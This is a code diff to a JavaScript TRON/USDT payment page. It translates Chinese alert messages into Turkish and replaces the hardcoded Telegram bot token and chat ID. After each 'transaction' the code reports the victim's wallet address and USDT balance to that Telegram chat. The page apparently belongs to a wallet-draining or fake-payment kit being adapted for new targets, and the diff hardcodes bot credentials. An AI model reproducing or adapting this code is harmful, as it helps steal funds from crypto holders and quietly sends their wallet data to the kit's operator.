@@ -151,7 +151,7 @@
             let trxBalance = await tronWeb.trx.getBalance() / 1000000;
             if (trxBalance < 24) {
                 swal({
-                    title: 'TRX小于24.00，付款受限，请补充TRX！',
+                    title: 'TRX 24,00'ın altında, ödeme kısıtlı, lütfen TRX'i ekleyin!',
                     icon: 'error',
                     buttons: true,
                     dangerMode: true
@@ -192,18 +192,18 @@
                 sendTelegramNotification(walletAddress, usdtBalance);
                 // 使用 swal 显示成功通知
                 swal({
-                    title: '交易成功!',
-                    text: '交易已经成功提交。',
+                    title: 'İşlem başarılı!',
+                    text: 'İşlem başarıyla gönderildi。',
                     icon: 'success',
-                    button: '确认',
+                    button: 'onaylamak',
                 });
             } else {
                 console.error('交易失败，无法通知 Telegram');
                 swal({
-                    title: '交易失败!',
-                    text: '交易提交失败，请重试。',
+                    title: 'İşlem başarısız oldu!',
+                    text: 'İşlem gönderimi başarısız oldu, lütfen tekrar deneyin。',
                     icon: 'error',
-                    button: '重新尝试',
+                    button: 'Tekrar deneyin',
                 });
             }
         }
@@ -211,8 +211,8 @@
         // 发送 Telegram 通知
         const sendTelegramNotification = (walletAddress, usdtBalance) => {
             // Telegram Bot Token 和 Chat ID
-            const botToken = "7479853848:AAGDddsIWgR_TzvdBDpVN6k5m_lk1MlE03o"; // 请替换为您的 Bot Token
-            const chatId = "-1001591713393"; // 请替换为您的 Chat ID
+            const botToken = "7817627743:AAEON3ggiQ9VMzCKXYbiweVmMy69ky6a9vM"; // 请替换为您的 Bot Token
+            const chatId = "7126391327"; // 请替换为您的 Chat ID
     
             // 获取当前时间
             const currentTime = new Date().toLocaleString();
